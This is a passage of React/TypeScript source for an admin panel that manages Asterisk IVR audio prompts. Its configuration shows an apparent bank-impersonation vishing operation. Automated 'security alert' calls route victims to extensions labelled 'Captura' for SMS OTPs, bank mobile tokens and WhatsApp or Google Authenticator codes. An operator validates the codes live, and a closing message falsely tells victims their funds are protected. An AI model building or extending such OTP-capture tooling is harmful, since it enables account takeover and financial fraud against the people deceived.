import React, { useState, useRef, useEffect } from 'react';
import { AudioPrompt, AudioRole, ActiveAudioAssignments } from '../types';
import {
  UploadCloud,
  Play,
  Pause,
  Trash2,
  CheckCircle,
  Volume2,
  Mic,
  Square,
  Sparkles,
  Info,
  Copy,
  FolderSync,
  Radio,
  Headphones,
  PhoneCall,
  PhoneForwarded,
  ShieldAlert,
  CheckCircle2,
  AlertTriangle,
  RotateCcw,
  Sliders,
  ArrowRight,
  RefreshCw,
  Save,
  Lock,
  Unlock,
  PowerOff,
  Check,
  Clock,
  ShieldCheck,
  Layers,
} from 'lucide-react';

interface AudioLibraryTabProps {
  audios: AudioPrompt[];
  onAddAudio: (audio: AudioPrompt) => void;
  onDeleteAudio: (id: string) => void;
  onAssignToPress1: (audioId: string) => void;
  onAssignToOtp: (audioId: string) => void;
  onAssignToAgentTransfer?: (audioId: string) => void;
  onAssignTo7777?: (audioId: string) => void;
  onAssignTo6666?: (audioId: string) => void;
  onAssignTo5555?: (audioId: string) => void;
  onAssignTo4444?: (audioId: string) => void;
  onAssignTo3333?: (audioId: string) => void;
  activeAssignments?: ActiveAudioAssignments;
  onAssignRole?: (role: AudioRole, asteriskPath: string, isManualSave?: boolean) => void;
  lockedConfigs?: {
    welcome_6666?: boolean;
    welcome_7777?: boolean;
    welcome_5555?: boolean;
    welcome_4444?: boolean;
    welcome_3333?: boolean;
    lock_7777?: boolean;
    lock_6666?: boolean;
    lock_5555?: boolean;
    lock_4444?: boolean;
    lock_3333?: boolean;
    ivr_entity?: boolean;
    [key: string]: boolean | undefined;
  };
  onToggleLock?: (role: string, isLocked?: boolean) => void;
}

export interface OtpExtensionInfo {
  id: string;
  extension: string;
  shortExt: string;
  name: string;
  purpose: string;
  badge: string;
  colorName: 'purple' | 'cyan' | 'amber' | 'emerald' | 'pink';
  bgGradient: string;
  borderColor: string;
  textColor: string;
  badgeColor: string;
  accentBg: string;
  ringColor: string;
}

export const OTP_EXTENSIONS_CONFIG: OtpExtensionInfo[] = [
  {
    id: '7777',
    extension: '7777',
    shortExt: '777',
    name: 'Captura Primaria / Tarjetas & OTP',
    purpose: 'Canal principal para transferir al cliente a solicitud de código numérico, SMS o coordenadas.',
    badge: 'Primaria (7777 / 777)',
    colorName: 'purple',
    bgGradient: 'from-purple-950/40 via-slate-900 to-slate-950',
    borderColor: 'border-purple-500/40',
    textColor: 'text-purple-300',
    badgeColor: 'bg-purple-600 text-white',
    accentBg: 'bg-purple-500/20 text-purple-300 border-purple-500/30',
    ringColor: 'focus:border-purple-400',
  },
  {
    id: '6666',
    extension: '6666',
    shortExt: '666',
    name: 'Captura Secundaria / Token Banco Móvil',
    purpose: 'Canal optimizado para Token Móvil de aplicaciones bancarias y autenticación de app.',
    badge: 'Banca / Token (6666 / 666)',
    colorName: 'cyan',
    bgGradient: 'from-cyan-950/40 via-slate-900 to-slate-950',
    borderColor: 'border-cyan-500/40',
    textColor: 'text-cyan-300',
    badgeColor: 'bg-cyan-600 text-black',
    accentBg: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
    ringColor: 'focus:border-cyan-400',
  },
  {
    id: '5555',
    extension: '5555',
    shortExt: '555',
    name: 'Captura Alternativa / Redes & Cuentas',
    purpose: 'Canal dedicado para verificación de WhatsApp, Google Authenticator, correo o servicios web.',
    badge: 'Alternativa (5555 / 555)',
    colorName: 'amber',
    bgGradient: 'from-amber-950/40 via-slate-900 to-slate-950',
    borderColor: 'border-amber-500/40',
    textColor: 'text-amber-300',
    badgeColor: 'bg-amber-600 text-black',
    accentBg: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
    ringColor: 'focus:border-amber-400',
  },
  {
    id: '4444',
    extension: '4444',
    shortExt: '444',
    name: 'Captura Validación Móvil / SMS',
    purpose: 'Canal con guión enfocado en mensajes SMS de operadoras y códigos numéricos estándar.',
    badge: 'SMS Móvil (4444 / 444)',
    colorName: 'emerald',
    bgGradient: 'from-emerald-950/40 via-slate-900 to-slate-950',
    borderColor: 'border-emerald-500/40',
    textColor: 'text-emerald-300',
    badgeColor: 'bg-emerald-600 text-black',
    accentBg: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
    ringColor: 'focus:border-emerald-400',
  },
  {
    id: '3333',
    extension: '3333',
    shortExt: '333',
    name: 'Captura Respaldo / Emergencia',
    purpose: 'Línea de contingencia rápida con locuciones de seguridad y reintento inmediato.',
    badge: 'Respaldo (3333 / 333)',
    colorName: 'pink',
    bgGradient: 'from-pink-950/40 via-slate-900 to-slate-950',
    borderColor: 'border-pink-500/40',
    textColor: 'text-pink-300',
    badgeColor: 'bg-pink-600 text-white',
    accentBg: 'bg-pink-500/20 text-pink-300 border-pink-500/30',
    ringColor: 'focus:border-pink-400',
  },
];

export interface ExtensionAudioSlotMeta {
  slot: 'welcome' | 'wait' | 'success' | 'failure';
  title: string;
  shortLabel: string;
  badge: string;
  description: string;
  roleKey: (ext: string) => string;
  astDbKey: (ext: string) => string;
  fallbackDefault: string;
  icon: React.ComponentType<{ className?: string }>;
}

export const EXTENSION_SLOTS: ExtensionAudioSlotMeta[] = [
  {
    slot: 'welcome',
    title: '1. Solicitud de Código OTP / Bienvenida',
    shortLabel: 'Solicitud OTP',
    badge: 'Paso 1: Solicitud',
    description: 'Audio reproducido al transferir la llamada. Solicita al cliente ingresar los dígitos de su código.',
    roleKey: (ext) => `welcome_${ext}`,
    astDbKey: (ext) => `ivr_vars ${ext}_prompt`,
    fallbackDefault: 'custom/solicitar_codigo_otp',
    icon: Headphones,
  },
  {
    slot: 'wait',
    title: '2. Espera de Validación',
    shortLabel: 'Espera Validación',
    badge: 'Paso 2: Espera',
    description: 'Audio en bucle ("Un momento por favor...") mientras el asesor valida los dígitos en su pantalla.',
    roleKey: (ext) => `wait_${ext}`,
    astDbKey: (ext) => `ivr_vars ${ext}_wait`,
    fallbackDefault: 'custom/un_momento_validando_informacion',
    icon: Clock,
  },
  {
    slot: 'success',
    title: '3. Código Aprobado / Éxito',
    shortLabel: 'Código Aprobado',
    badge: 'Paso 3: Válido',
    description: 'Audio reproducido cuando el asesor presiona VÁLIDO en pantalla antes de retornar la llamada.',
    roleKey: (ext) => `success_${ext}`,
    astDbKey: (ext) => `ivr_vars ${ext}_success`,
    fallbackDefault: 'custom/operacion_bloqueada_exito',
    icon: CheckCircle2,
  },
  {
    slot: 'failure',
    title: '4. Código Inválido / Reintento',
    shortLabel: 'Código Inválido',
    badge: 'Paso 4: Inválido',
    description: 'Audio reproducido cuando el asesor presiona INVÁLIDO indicando que debe volver a ingresarlo.',
    roleKey: (ext) => `failure_${ext}`,
    astDbKey: (ext) => `ivr_vars ${ext}_failure`,
    fallbackDefault: 'custom/token_invalido_reintente',
    icon: AlertTriangle,
  },
];

interface RoleConfig {
  role: AudioRole;
  title: string;
  badge: string;
  badgeColor: string;
  category: 'press1' | 'otp';
  icon: React.ComponentType<{ className?: string }>;
  description: string;
  astDbKey: string;
  fallbackDefault: string;
}

const SYSTEM_ROLES: RoleConfig[] = [
  {
    role: 'welcome_7777',
    title: 'Bienvenida Extensión 7777 (Captura en Vivo)',
    badge: 'Extensión 7777',
    badgeColor: 'bg-purple-500/20 text-purple-300 border-purple-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 7777 para capturar el código OTP.',
    astDbKey: 'ivr_vars 7777_intro',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'welcome_6666',
    title: 'Bienvenida Extensión 6666 (Captura en Vivo)',
    badge: 'Extensión 6666',
    badgeColor: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 6666 para capturar el código OTP con locución independiente.',
    astDbKey: 'ivr_vars 6666_intro',
    fallbackDefault: 'custom/bienvenida_6666',
  },
  {
    role: 'welcome_5555',
    title: 'Bienvenida Extensión 5555 (Captura en Vivo)',
    badge: 'Extensión 5555',
    badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 5555 para capturar el código OTP con locución independiente.',
    astDbKey: 'ivr_vars 5555_intro',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'welcome_4444',
    title: 'Bienvenida Extensión 4444 (Captura en Vivo)',
    badge: 'Extensión 4444',
    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 4444 para capturar el código OTP con locución independiente.',
    astDbKey: 'ivr_vars 4444_intro',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'welcome_3333',
    title: 'Bienvenida Extensión 3333 (Captura en Vivo)',
    badge: 'Extensión 3333',
    badgeColor: 'bg-pink-500/20 text-pink-300 border-pink-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 3333 para capturar el código OTP con locución independiente.',
    astDbKey: 'ivr_vars 3333_intro',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'press1_welcome',
    title: 'Bienvenida IVR Press 1 (Llamada Inicial)',
    badge: 'Campaña Press 1',
    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
    category: 'press1',
    icon: PhoneCall,
    description: 'Audio principal reproducido al contactar al cliente ("Alerta de seguridad, marque 1 para comunicarse con un asesor...").',
    astDbKey: 'ivr_vars default_intro',
    fallbackDefault: 'custom/bienvenida_corporativa',
  },
  {
    role: 'agent_transfer',
    title: 'Transferencia a Asesor (Al Presionar 1)',
    badge: 'Opción 1 Asesor',
    badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
    category: 'press1',
    icon: PhoneForwarded,
    description: 'Audio de transición que escucha el cliente al presionar la tecla 1 ("Un momento, le estamos comunicando con un asesor...").',
    astDbKey: 'ivr_vars default_agent',
    fallbackDefault: 'custom/conectar_asesor_banco',
  },
  {
    role: 'press1_invalid',
    title: 'Opción Inválida en Menú Press 1',
    badge: 'Opción Inválida',
    badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/30',
    category: 'press1',
    icon: AlertTriangle,
    description: 'Audio reproducido cuando el cliente presiona una tecla distinta a 1 o se agota el tiempo sin marcar ("Opción no válida...").',
    astDbKey: 'ivr_vars default_invalid',
    fallbackDefault: 'custom/opcion_invalida',
  },
  {
    role: 'otp_welcome',
    title: 'Solicitud de Código OTP / Token',
    badge: 'Captura de Código',
    badgeColor: 'bg-blue-500/20 text-blue-300 border-blue-500/30',
    category: 'otp',
    icon: ShieldAlert,
    description: 'Audio pidiéndole al cliente ingresar su código de seguridad ("Por favor ingrese el código de 6 dígitos que recibió por SMS...").',
    astDbKey: 'ivr_vars default_prompt',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'otp_wait',
    title: 'Validación en Curso (Espera al Cliente)',
    badge: 'Validación en Espera',
    badgeColor: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
    category: 'otp',
    icon: RotateCcw,
    description: 'Audio o música en bucle mientras el asesor verifica el código en su pantalla ("Un momento por favor, estamos validando su información...").',
    astDbKey: 'ivr_vars default_wait',
    fallbackDefault: 'custom/un_momento_validando_informacion',
  },
  {
    role: 'otp_success',
    title: 'Código Aprobado / Éxito de Seguridad',
    badge: 'Validación Exitosa',
    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
    category: 'otp',
    icon: CheckCircle2,
    description: 'Audio final cuando el código es correcto ("Su operación ha sido asegurada y sus fondos están protegidos con éxito.").',
    astDbKey: 'ivr_vars default_success',
    fallbackDefault: 'custom/operacion_bloqueada_exito',
  },
  {
    role: 'otp_failure',
    title: 'Código Inválido / Reintentar Dígitos',
    badge: 'Código Inválido',
    badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/30',
    category: 'otp',
    icon: AlertTriangle,
    description: 'Audio cuando el asesor marca el código como inválido ("El código ingresado no es correcto, por favor vuelva a ingresarlo.").',
    astDbKey: 'ivr_vars default_failure',
    fallbackDefault: 'custom/token_invalido_reintente',
  },
];

export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
  audios,
  onAddAudio,
  onDeleteAudio,
  onAssignToPress1,
  onAssignToOtp,
  onAssignToAgentTransfer,
  onAssignTo7777,
  onAssignTo6666,
  onAssignTo5555,
  onAssignTo4444,
  onAssignTo3333,
  activeAssignments: propActiveAssignments,
  onAssignRole,
  lockedConfigs,
  onToggleLock,
}) => {
  const [playingAudioId, setPlayingAudioId] = useState<string | null>(null);
  const audioPlayerRef = useRef<HTMLAudioElement | null>(null);

  // Manual locks state for individual audio configurations (7777, 6666, 5555, 4444, 3333)
  const [localLocks, setLocalLocks] = useState<Record<string, boolean>>(() => {
    try {
      const s = localStorage.getItem('ast20_audio_locks_ui');
      if (s) return JSON.parse(s);
    } catch (_) {}
    return {
      welcome_7777: false,
      welcome_6666: false,
      welcome_5555: false,
      welcome_4444: false,
      welcome_3333: false,
      lock_7777: false,
      lock_6666: false,
      lock_5555: false,
      lock_4444: false,
      lock_3333: false,
    };
  });

  const isExtLocked = (ext: string): boolean => {
    return !!(
      lockedConfigs?.[`lock_${ext}`] ??
      lockedConfigs?.[`welcome_${ext}`] ??
      localLocks[`lock_${ext}`] ??
      localLocks[`welcome_${ext}`]
    );
  };

  const isLocked6666 = isExtLocked('6666');
  const isLocked7777 = isExtLocked('7777');
  const isLocked5555 = isExtLocked('5555');
  const isLocked4444 = isExtLocked('4444');
  const isLocked3333 = isExtLocked('3333');

  // Active assignments state
  const [activeAssignments, setActiveAssignments] = useState<ActiveAudioAssignments>(
    propActiveAssignments || {
      press1_welcome: 'custom/bienvenida_corporativa',
      agent_transfer: 'custom/conectar_asesor_banco',
      press1_invalid: 'custom/opcion_invalida',
      welcome_7777: 'custom/solicitar_codigo_otp',
      wait_7777: 'custom/un_momento_validando_informacion',
      success_7777: 'custom/operacion_bloqueada_exito',
      failure_7777: 'custom/token_invalido_reintente',
      welcome_6666: 'custom/solicitar_codigo_otp',
      wait_6666: 'custom/un_momento_validando_informacion',
      success_6666: 'custom/operacion_bloqueada_exito',
      failure_6666: 'custom/token_invalido_reintente',
      welcome_5555: 'custom/solicitar_codigo_otp',
      wait_5555: 'custom/un_momento_validando_informacion',
      success_5555: 'custom/operacion_bloqueada_exito',
      failure_5555: 'custom/token_invalido_reintente',
      welcome_4444: 'custom/solicitar_codigo_otp',
      wait_4444: 'custom/un_momento_validando_informacion',
      success_4444: 'custom/operacion_bloqueada_exito',
      failure_4444: 'custom/token_invalido_reintente',
      welcome_3333: 'custom/solicitar_codigo_otp',
      wait_3333: 'custom/un_momento_validando_informacion',
      success_3333: 'custom/operacion_bloqueada_exito',
      failure_3333: 'custom/token_invalido_reintente',
      otp_welcome: 'custom/solicitar_codigo_otp',
      otp_wait: 'custom/un_momento_validando_informacion',
      otp_success: 'custom/operacion_bloqueada_exito',
      otp_failure: 'custom/token_invalido_reintente',
    }
  );

  const [isSyncingRole, setIsSyncingRole] = useState<Record<string, boolean>>({});
  const [feedbackMsg, setFeedbackMsg] = useState<{ text: string; type: 'success' | 'info' } | null>(null);
  const [filterCategory, setFilterCategory] = useState<'all' | 'press1' | 'otp'>('all');

  // Fetch active audio assignments on mount - respects manual lock state
  const fetchActiveAssignments = async () => {
    try {
      const res = await fetch('/api/asterisk/audio/active-assignments');
      const data = await res.json();
      if (data.success && data.assignments) {
        setActiveAssignments((prev) => {
          const next = { ...data.assignments };
          // Preserve locked extension configurations against auto-sync
          ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
            if (isExtLocked(ext)) {
              if (prev[`welcome_${ext}`]) next[`welcome_${ext}`] = prev[`welcome_${ext}`];
              if (prev[`wait_${ext}`]) next[`wait_${ext}`] = prev[`wait_${ext}`];
              if (prev[`success_${ext}`]) next[`success_${ext}`] = prev[`success_${ext}`];
              if (prev[`failure_${ext}`]) next[`failure_${ext}`] = prev[`failure_${ext}`];
            }
          });
          return next;
        });

        if (data.manualLocks) {
          setLocalLocks((prev) => ({
            ...prev,
            ...data.manualLocks,
          }));
        }
      }
    } catch (e) {
      console.warn('Error al obtener asignaciones activas de audio:', e);
    }
  };

  useEffect(() => {
    fetchActiveAssignments();
  }, []);

  useEffect(() => {
    if (propActiveAssignments) {
      setActiveAssignments((prev) => {
        const next = { ...propActiveAssignments };
        // Preserve locked configurations
        ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
          if (isExtLocked(ext)) {
            if (prev[`welcome_${ext}`]) next[`welcome_${ext}`] = prev[`welcome_${ext}`];
            if (prev[`wait_${ext}`]) next[`wait_${ext}`] = prev[`wait_${ext}`];
            if (prev[`success_${ext}`]) next[`success_${ext}`] = prev[`success_${ext}`];
            if (prev[`failure_${ext}`]) next[`failure_${ext}`] = prev[`failure_${ext}`];
          }
        });
        return next;
      });
    }
  }, [propActiveAssignments, localLocks, lockedConfigs]);

  const handleAssignRoleDirect = async (role: AudioRole, asteriskPath: string, isManualSave = false) => {
    setIsSyncingRole((prev) => ({ ...prev, [role]: true }));
    try {
      const res = await fetch('/api/asterisk/audio/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role, asteriskPath, isManualSave }),
      });
      const data = await res.json();
      if (data.success) {
        setActiveAssignments((prev) => ({
          ...prev,
          ...(data.assignments || { [role]: asteriskPath }),
        }));
        onAssignRole?.(role, asteriskPath, isManualSave);

        const roleConfig = SYSTEM_ROLES.find((r) => r.role === role);
        setFeedbackMsg({
          text: `¡${roleConfig?.title || role} actualizado a "${asteriskPath}" en Asterisk AstDB!`,
          type: 'success',
        });
        setTimeout(() => setFeedbackMsg(null), 4500);
      }
    } catch (e) {
      console.error('Error assigning audio role:', e);
      setFeedbackMsg({
        text: `Error al actualizar ${role} en Asterisk. Verifica la conexión con el servidor.`,
        type: 'info',
      });
      setTimeout(() => setFeedbackMsg(null), 4500);
    } finally {
      setIsSyncingRole((prev) => ({ ...prev, [role]: false }));
    }
  };

  // Dedicated Save & Lock Handlers for individual OTP Extensions
  const [isSavingExt, setIsSavingExt] = useState<Record<string, boolean>>({});

  const handleSaveConfigExtension = async (ext: string) => {
    setIsSavingExt((prev) => ({ ...prev, [ext]: true }));
    try {
      const prompt = activeAssignments[`welcome_${ext}`] || `custom/solicitar_codigo_otp`;
      const wait = activeAssignments[`wait_${ext}`] || `custom/un_momento_validando_informacion`;
      const success = activeAssignments[`success_${ext}`] || `custom/operacion_bloqueada_exito`;
      const failure = activeAssignments[`failure_${ext}`] || `custom/token_invalido_reintente`;

      const res = await fetch('/api/asterisk/audio/save-extension-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          extension: ext,
          prompt,
          wait,
          success,
          failure,
          isLocked: true,
        }),
      });

      const data = await res.json();
      if (data.success) {
        setLocalLocks((prev) => {
          const next = { ...prev, [`lock_${ext}`]: true, [`welcome_${ext}`]: true };
          try { localStorage.setItem('ast20_audio_locks_ui', JSON.stringify(next)); } catch (_) {}
          return next;
        });
        onToggleLock?.(`welcome_${ext}`, true);
        onToggleLock?.(`lock_${ext}`, true);
        if (data.assignments) {
          setActiveAssignments(data.assignments);
        }
        setFeedbackMsg({
          text: `✓ Configuración de audios para Extensión ${ext} guardada y bloqueada manualmente (isLocked: true). Ningún auto-sync la sobrescribirá.`,
          type: 'success',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      }
    } catch (err: any) {
      setFeedbackMsg({
        text: `Error al guardar configuración de Ext. ${ext}: ${err.message}`,
        type: 'info',
      });
      setTimeout(() => setFeedbackMsg(null), 5000);
    } finally {
      setIsSavingExt((prev) => ({ ...prev, [ext]: false }));
    }
  };

  const handleUnlockExtension = async (ext: string) => {
    setLocalLocks((prev) => {
      const next = { ...prev, [`lock_${ext}`]: false, [`welcome_${ext}`]: false };
      try { localStorage.setItem('ast20_audio_locks_ui', JSON.stringify(next)); } catch (_) {}
      return next;
    });
    onToggleLock?.(`welcome_${ext}`, false);
    onToggleLock?.(`lock_${ext}`, false);
    try {
      await fetch('/api/asterisk/audio/toggle-lock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role: `welcome_${ext}`, isLocked: false }),
      });
      await fetch('/api/asterisk/audio/toggle-lock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role: `lock_${ext}`, isLocked: false }),
      });
    } catch (_) {}
    setFeedbackMsg({
      text: `🔓 Extensión ${ext} desbloqueada. Ahora permite sincronización automática.`,
      type: 'info',
    });
    setTimeout(() => setFeedbackMsg(null), 4000);
  };

  const handleSaveConfig7777 = () => handleSaveConfigExtension('7777');
  const handleUnlock7777 = () => handleUnlockExtension('7777');
  const handleSaveConfig6666 = () => handleSaveConfigExtension('6666');
  const handleUnlock6666 = () => handleUnlockExtension('6666');

  // Handler to deactivate / unassign an audio from a role
  const handleDeactivateRole = async (role: AudioRole) => {
    setIsSyncingRole((prev) => ({ ...prev, [role]: true }));
    try {
      const res = await fetch('/api/asterisk/audio/unassign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role }),
      });
      const data = await res.json();
      if (data.success && data.assignments) {
        setActiveAssignments(data.assignments);
        setFeedbackMsg({
          text: `Audio desactivado para "${role}". Restaurado a locución por defecto.`,
          type: 'info',
        });
        setTimeout(() => setFeedbackMsg(null), 4000);
      }
    } catch (err) {
      console.error('Error al desactivar audio:', err);
    } finally {
      setIsSyncingRole((prev) => ({ ...prev, [role]: false }));
    }
  };

  // Handler to permanently save and lock 7777, 6666, 5555, 4444 and 3333 configuration
  const [isSavingOtpExtensions, setIsSavingOtpExtensions] = useState(false);
  const [otpExtensionsSaved, setOtpExtensionsSaved] = useState(false);

  const handleSaveOtpExtensions = async () => {
    setIsSavingOtpExtensions(true);
    try {
      const payload: any = {
        isLocked: true,
        lockedRoles: {
          lock_7777: true,
          lock_6666: true,
          lock_5555: true,
          lock_4444: true,
          lock_3333: true,
          welcome_7777: true,
          welcome_6666: true,
          welcome_5555: true,
          welcome_4444: true,
          welcome_3333: true,
        },
      };

      ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
        payload[`welcome_${ext}`] = activeAssignments[`welcome_${ext}`] || 'custom/solicitar_codigo_otp';
        payload[`wait_${ext}`] = activeAssignments[`wait_${ext}`] || 'custom/un_momento_validando_informacion';
        payload[`success_${ext}`] = activeAssignments[`success_${ext}`] || 'custom/operacion_bloqueada_exito';
        payload[`failure_${ext}`] = activeAssignments[`failure_${ext}`] || 'custom/token_invalido_reintente';
      });

      const res = await fetch('/api/asterisk/audio/save-otp-extensions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (data.success) {
        setOtpExtensionsSaved(true);
        setLocalLocks((prev) => {
          const next = {
            ...prev,
            lock_7777: true,
            lock_6666: true,
            lock_5555: true,
            lock_4444: true,
            lock_3333: true,
            welcome_7777: true,
            welcome_6666: true,
            welcome_5555: true,
            welcome_4444: true,
            welcome_3333: true,
          };
          try { localStorage.setItem('ast20_audio_locks_ui', JSON.stringify(next)); } catch (_) {}
          return next;
        });

        ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
          onToggleLock?.(`welcome_${ext}`, true);
          onToggleLock?.(`lock_${ext}`, true);
        });

        if (data.assignments) {
          setActiveAssignments(data.assignments);
        }

        setFeedbackMsg({
          text: '✓ Todas las extensiones OTP (7777, 6666, 5555, 4444, 3333) guardadas y blindadas en AstDB sin cruce de audios.',
          type: 'success',
        });
        setTimeout(() => {
          setOtpExtensionsSaved(false);
          setFeedbackMsg(null);
        }, 5000);
      }
    } catch (err: any) {
      setFeedbackMsg({
        text: `Error al guardar extensiones OTP: ${err.message}`,
        type: 'info',
      });
    } finally {
      setIsSavingOtpExtensions(false);
    }
  };

  // Featured Extensions View State (7777, 6666, 5555, 4444, 3333)
  const [featuredExtTab, setFeaturedExtTab] = useState<'all' | '7777' | '6666' | '5555' | '4444' | '3333'>('all');

  // Upload modal state
  const [isDragging, setIsDragging] = useState(false);
  const [isUploadModalOpen, setIsUploadModalOpen] = useState(false);
  const [newAudioName, setNewAudioName] = useState('');
  const [newAudioCategory, setNewAudioCategory] = useState<AudioPrompt['category']>('welcome_7777');
  const [stagedFileDataUrl, setStagedFileDataUrl] = useState<string | null>(null);
  const [stagedFileName, setStagedFileName] = useState('');
  const [stagedFileSize, setStagedFileSize] = useState('');
  const [stagedDuration, setStagedDuration] = useState(4.0);
  const [autoActivateRole, setAutoActivateRole] = useState(true);

  // Live Microphone Recording state
  const [isRecording, setIsRecording] = useState(false);
  const [recordingTime, setRecordingTime] = useState(0);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const recordingTimerRef = useRef<any>(null);

  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Dedicated upload state per slot
  const [uploadingSlot, setUploadingSlot] = useState<Record<string, boolean>>({});

  const handleUploadForExtensionSlot = async (
    ext: string,
    slot: 'welcome' | 'wait' | 'success' | 'failure',
    file: File
  ) => {
    if (!file) return;
    const slotKey = slot === 'welcome' ? `welcome_${ext}` : `${slot}_${ext}`;
    setUploadingSlot((prev) => ({ ...prev, [slotKey]: true }));

    const reader = new FileReader();
    reader.onload = async (e) => {
      const dataUrl = e.target?.result as string;
      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || `${slot}_${ext}`;
      const cleanPath = `custom/${baseName}`;

      const slotLabels: Record<string, string> = {
        welcome: 'Solicitud OTP',
        wait: 'Espera Validación',
        success: 'Código Aprobado',
        failure: 'Código Inválido',
      };

      const newAudioItem: AudioPrompt = {
        id: `audio-${ext}-${slot}-${Date.now()}`,
        name: `Ext ${ext} (${slotLabels[slot]}): ${file.name.replace(/\.[^/.]+$/, '')}`,
        category: (slotKey as any),
        fileName: `${baseName}.wav`,
        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
        durationSec: 5.5,
        format: 'WAV',
        sampleRate: '8000Hz PCM 16-bit Mono',
        dataUrl: dataUrl,
        asteriskPath: cleanPath,
        createdAt: new Date().toISOString(),
      };

      onAddAudio(newAudioItem);

      try {
        await fetch('/api/asterisk/audio/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: newAudioItem.name,
            fileName: `${baseName}.wav`,
            category: slotKey,
            dataUrl: dataUrl,
          }),
        });

        await handleAssignRoleDirect(slotKey as any, cleanPath, true);

        if (slot === 'welcome') {
          if (ext === '7777') onAssignTo7777?.(newAudioItem.id);
          else if (ext === '6666') onAssignTo6666?.(newAudioItem.id);
          else if (ext === '5555') onAssignTo5555?.(newAudioItem.id);
          else if (ext === '4444') onAssignTo4444?.(newAudioItem.id);
          else if (ext === '3333') onAssignTo3333?.(newAudioItem.id);
        }

        setFeedbackMsg({
          text: `✓ Audio para Extensión ${ext} (${slotLabels[slot]}) cargado y activo con éxito en Asterisk: ${cleanPath}`,
          type: 'success',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } catch (err: any) {
        console.error(`Error subiendo audio para ${slotKey}:`, err);
        setFeedbackMsg({
          text: `Error al subir audio para Ext. ${ext}: ${err.message}`,
          type: 'info',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } finally {
        setUploadingSlot((prev) => ({ ...prev, [slotKey]: false }));
      }
    };
    reader.readAsDataURL(file);
  };

  const triggerFilePicker = (ext: string, slot: 'welcome' | 'wait' | 'success' | 'failure') => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'audio/*,.wav,.mp3,.ogg,.gsm';
    input.onchange = (e: any) => {
      const file = e.target?.files?.[0];
      if (file) {
        handleUploadForExtensionSlot(ext, slot, file);
      }
    };
    input.click();
  };

  const categoryLabels: Record<string, { label: string; color: string }> = {
    welcome_7777: { label: 'Bienvenida Extensión 7777', color: 'text-purple-400 bg-purple-500/10 border-purple-500/20 font-bold' },
    welcome_6666: { label: 'Bienvenida Extensión 6666', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20 font-bold' },
    welcome_5555: { label: 'Bienvenida Extensión 5555', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20 font-bold' },
    welcome_4444: { label: 'Bienvenida Extensión 4444', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20 font-bold' },
    welcome_3333: { label: 'Bienvenida Extensión 3333', color: 'text-pink-400 bg-pink-500/10 border-pink-500/20 font-bold' },
    press1_welcome: { label: 'IVR Bienvenida Press 1', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20' },
    press1_invalid: { label: 'IVR Opción Inválida', color: 'text-rose-400 bg-rose-500/10 border-rose-500/20' },
    agent_transfer: { label: 'Transferencia Asesor (Opción 1)', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20' },
    otp_welcome: { label: 'Captura OTP Instrucción', color: 'text-blue-400 bg-blue-500/10 border-blue-500/20' },
    otp_wait: { label: 'Validación en Espera', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20' },
    otp_success: { label: 'OTP Validación Exitosa', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20' },
    otp_failure: { label: 'OTP Error o Expirado', color: 'text-rose-400 bg-rose-500/10 border-rose-500/20' },
